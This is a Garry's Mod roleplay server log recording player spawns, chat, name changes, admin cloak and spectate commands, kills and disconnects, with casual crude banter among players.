+[20:34:34] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:34:36] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:34:36] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:34:38] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:34:38] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:34:38] Derp: color of names?
+[20:34:39] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:34:39] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:34:40] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:34:40] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:34:42] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:34:42] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:34:43] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:34:43] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:34:45] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:34:45] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:34:58] thomas: // its womble dumbass
+[20:34:58] Derp: i think that already is a thing
+[20:35:07] thomas: /name mohammed from uber eats
+[20:35:17] Derp: you mean this?
+[20:35:20] Derp: my name is now yellow?
+[20:35:30] Derp: like to whatever u want?
+[20:35:36] mohammed from uber eats: /name bert simson
+[20:35:59] Derp: um im sure there is a way to do that but right now its just for jobs
+[20:36:17] Derp: aight
+[20:36:25] Derp: orange or some shit
+[20:36:34] Derp: idk i think citizen is green
+[20:36:51] Derp: alright i will try to figure that out
+[20:36:56] Derp: we update the server like every week so
+[20:37:04] bert simson: /drop
+[20:37:15] Derp: soon we are gonna be getting a custom map
+[20:37:25] Client "Womble" spawned in server <STEAM_0:1:110782291> (took 211 seconds).
+[20:37:32] Derp: its gonna be an entirely new map
+[20:38:01] xd MrShrimp granted god mode upon Themself
+[20:38:03] Derp: its gonna be a downtown type of map but just not downtown or any other map u have seen so far
+[20:38:09] Womble: /name Squishy
+[20:38:09] bert simson: hmm
+[20:38:19] bert simson: hmmmmmm
+[20:38:23] Squishy: /me nuzzles
+[20:38:29] Derp: nah its gonna be smaller and this map is actually laggy as fuck
+[20:38:42] bert simson: talk real quick
+[20:38:44] Squishy: Would you care to join the Furries?
+[20:38:45] Derp: me neither but compared to other maps this one is more demanding
+[20:38:54] Derp: especially because of the ocean
+[20:39:04] Squishy: ?
+[20:39:06] Derp: yeah its dumb af
+[20:39:24] Derp: dont worry we will make sure the map is optimized and easy to figure out
+[20:39:27] Derp: its not gonna be anything extreme
+[20:39:28] bert simson: hmm
+[20:39:39] bert simson: you know a guy named mohammed by chance?
+[20:39:43] Derp: bert is a chill dude so dont be harsh on him lol
+[20:39:49] Squishy: No, I don't believe so
+[20:39:52] Derp: ah
+[20:39:59] Derp: let me go see this squishy guy
+[20:40:03] bert simson: no hes uhhh an uber eats driver
+[20:40:07] xd MrShrimp: !spectate squishy
+[20:40:19] xd MrShrimp uncloaked Themself
+[20:40:21] xd MrShrimp cloaked Themself by amount 0
+[20:40:30] Squishy: /me nuzzles
+[20:40:37] xd MrShrimp: !logs
+[20:40:55] Squishy: /me nuzzles
+[20:41:02] xd MrShrimp: /pm derp m watching
+[20:41:07] xd MrShrimp: /pm derp im
+[20:41:14] Squishy: /me puts on Fursuit
+[20:41:29] xd MrShrimp uncloaked Themself
+[20:41:31] Squishy: /me takes out a sign, stating the text
+[20:41:31] xd MrShrimp cloaked Themself by amount 0
+[20:41:34] Squishy: /me 'uwu'
+[20:41:36] Derp killed Squishy using player
+[20:41:36] Derp killed bert simson using player
+[20:41:37] xd MrShrimp uncloaked Themself
+[20:41:43] xd MrShrimp cloaked Themself by amount 0
+[20:41:43] xd MrShrimp uncloaked Themself
+[20:41:44] xd MrShrimp uncloaked Themself
+[20:41:44] xd MrShrimp uncloaked Themself
+[20:41:46] bert simson: he has some methamphetamines
+[20:41:46] xd MrShrimp uncloaked Themself
+[20:41:48] xd MrShrimp cloaked Themself by amount 0
+[20:41:51] Squishy: // 'Fatality'
+[20:42:02] bert simson: // dude thats the best csgo cheat
+[20:42:06] Squishy: // What?
+[20:42:08] Squishy: // Are you okay?
+[20:42:17] Squishy: /me nuzzles
+[20:42:36] xd MrShrimp: /giveweapon xd cw_tr09_mp9
+[20:42:46] xd MrShrimp: !logs
+[20:42:46] xd MrShrimp uncloaked Themself
+[20:42:47] Squishy: I wasn't planning on it
+[20:42:49] xd MrShrimp cloaked Themself by amount 0
+[20:42:59] xd MrShrimp uncloaked Themself
+[20:43:02] xd MrShrimp cloaked Themself by amount 0
+[20:43:08] xd MrShrimp uncloaked Themself
+[20:43:09] xd MrShrimp cloaked Themself by amount 0
+[20:43:10] bert simson: // ??? all other cheats pale in comparison to fatality man its been undetected since 2008
+[20:43:20] xd MrShrimp uncloaked Themself
+[20:43:23] xd MrShrimp cloaked Themself by amount 0
+[20:43:33] xd MrShrimp uncloaked Themself
+[20:43:40] Squishy: You ever been with a four-headed gorilla equipped with a dogs legs, cows chest, gorilla head, snake tongue, and bird feet
+[20:43:41] xd MrShrimp cloaked Themself by amount 0
+[20:43:42] xd MrShrimp cloaked Themself by amount 0
+[20:43:44] Squishy: I can help you out
+[20:43:52] xd MrShrimp uncloaked Themself
+[20:44:07] xd MrShrimp cloaked Themself by amount 0
+[20:44:11] xd MrShrimp uncloaked Themself
+[20:44:15] xd MrShrimp cloaked Themself by amount 0
+[20:44:25] Derp<STEAM_0:0:52504530> spawned vehicle models/sligwolf/fcc/flying_crawler_car.mdl
+[20:44:41] xd MrShrimp: // brb
+[20:44:55] Dropped "xd MrShrimp" from server<STEAM_0:0:121940340>
+[20:44:57] Squishy: /me nuzzles
+[20:45:02] Squishy was killed by prop_vehicle_jeep
+[20:45:51] bert simson: fake duck police
+[20:48:40] Dropped "Squishy" from server<STEAM_0:1:110782291>
+[20:49:08] bert simson: // smh fake womble
+[20:52:19] Derp: DerpCorp
+[20:52:29] DrDerpenstein: DerpCoRP
+[20:53:17] Derp suicided!
+[20:53:21] Dropped "Derp" from server<STEAM_0:0:52504530>
+[20:54:29] bert simson killed DrDerpenstein using player
+[20:54:47] bert simson: /drop
+[20:54:53] Dropped "bert simson" from server<STEAM_0:1:179345279>
+[21:27:27] Dropped "DrDerpenstein" from server<STEAM_0:0:13562763>
